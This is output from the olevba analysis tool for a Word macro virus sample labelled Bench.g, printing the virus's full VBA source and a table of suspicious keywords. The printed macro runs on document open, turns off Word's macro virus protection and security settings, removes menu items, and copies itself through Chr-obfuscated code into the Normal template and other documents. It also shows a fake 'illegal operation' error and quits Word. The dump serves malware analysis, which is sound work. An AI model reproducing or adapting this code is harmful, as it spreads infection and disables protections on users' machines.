olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
MACRONAME = BENCH
On Error Resume Next
AD_Installed = False: NT_Installed = False
If Application.Version = 9# Then
CommandBars("Macro").Controls("Security...").Delete
Else
With Application.Options
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
With Application.CommandBars("Tools")
    .Controls("Templates and Add-Ins...").Enabled = False
    .Controls("Customize...").Enabled = False
    .Controls("Macro").Delete
End With
Application.CommandBars("View").Controls("Toolbars").Delete
Application.CommandBars("Format").Controls("Style...").Delete
Options.ConfirmConversions = False
Set NTC = NormalTemplate.VBProject.VBComponents.Item(1): Set ADC = ActiveDocument.VBProject.VBComponents.Item(1)
N_Identify = NTC.CodeModule.Lines(2, 1): A_Identify = ADC.CodeModule.Lines(2, 1)
If UCase(N_Identify) = "MACRONAME = BENCH" Then NT_Installed = True
If UCase(A_Identify) = "MACRONAME = BENCH" Then AD_Installed = True
N_Lines = NTC.CodeModule.CountOfLines: A_Lines = ADC.CodeModule.CountOfLines
If NT_Installed = True And AD_Installed = True Then GoTo over
If NT_Installed = False And N_Lines > 0 Then NTC.CodeModule.DeleteLines 1, N_Lines
If AD_Installed = False And A_Lines > 0 Then ADC.CodeModule.DeleteLines 1, A_Lines
If NT_Installed = False Then
With NTC.CodeModule
.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ADC.CodeModule.Lines(2, A_Lines))
.ReplaceLine 76, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(86) + Chr(105) + Chr(101) + Chr(119) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(40) + Chr(41)
End With
Application.Caption = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(32) + Chr(40) + Chr(66) + Chr(41)
End If
If AD_Installed = False Then
With ADC.CodeModule
.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & NTC.CodeModule.Lines(2, N_Lines))
.ReplaceLine 76, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(40) + Chr(41)
End With
End If
over:
If Minute(Now) >= 30 And Minute(Now) <= 40 Then
ActiveDocument.Content.Font.Animation = wdAnimationSparkleText
With Assistant.NewBalloon
.Icon = msoIconAlert
.Heading = "[Bench] MV97/2000"
.Text = "Our Motto:" & vbCr & _
        "Tell me, I forget;" & vbCr & _
        "Show me, I remember;" & vbCr & _
        "Involve me, I understand." & vbCr & vbCr & _
        "Skyline College..." & vbCr & "On our way to success! ;)" _
        & vbCr & "(Hopefully)"
.Animation = msoAnimationGetAttentionMajor
.Show
End With
ElseIf Minute(Now) > 40 And Minute(Now) <= 0 Then
ActiveDocument.Content.Font.Animation = wdAnimationShimmer
With Assistant.NewBalloon
.Icon = msoIconAlert
.Heading = "Shimmer 2K"
.Text = "I was born to shimmer! Was born to shine! Born to radiate!" _
        & vbCr & vbCr _
        & "Sigh! Everything's getting fuzzy and blurred..."
.Animation = msoAnimationGetAttentionMajor
.Show
End With
End If
If NT_Installed = True And AD_Installed = False And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True
End If
End Sub
Sub ToolsMacro()
On Error Resume Next
MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(104) + Chr(97) + Chr(115) + Chr(32) + Chr(112) + Chr(101) + Chr(114) + Chr(102) + Chr(111) + Chr(114) + Chr(109) + Chr(101) + Chr(100) + Chr(32) + Chr(97) + Chr(110) + Chr(32) + Chr(105) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(108) + Chr(108) + Chr(32) + Chr(115) + Chr(104) + Chr(117) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(46), vbCritical, "Microsoft Word"
If NT_Installed = True And AD_Installed = False And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True
End If
Application.Quit
End Sub

'          =================================
'          | Greetz go out to:             |
'          | SlageHammer - Thanks a lot!   |
'          |===============================|
'          | Ya'll ppl from Skyline!       |
'          | LOL They formatted the comps. |
'          | infected with a GROOVIE var.  |
'          |===============================|
'          | Everyone else out there readn |
'          | this!                         |
'          | AVP, NAI and Symantec ppl! =) |
'          |===============================|
'          | Macro's Name - Shimmer        |
'          | Author - [Bench]              |
'          |===============================|
'          | Author's Comments:            |
'          | The code is all jumbled up and|
'          | garbage. Hey! It's my first   |
'          | original macro!               |
'          | And I'm a newbie!             |
'          |===============================|
'          | excess:                       |
'          | Payload idea from Sparkle 97  |
'          | and the song "Shimmer" by     |
'          | Shawn Mullins... ;P           |
'          =================================
' This macro shows what boredom can do to a guy :D













































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

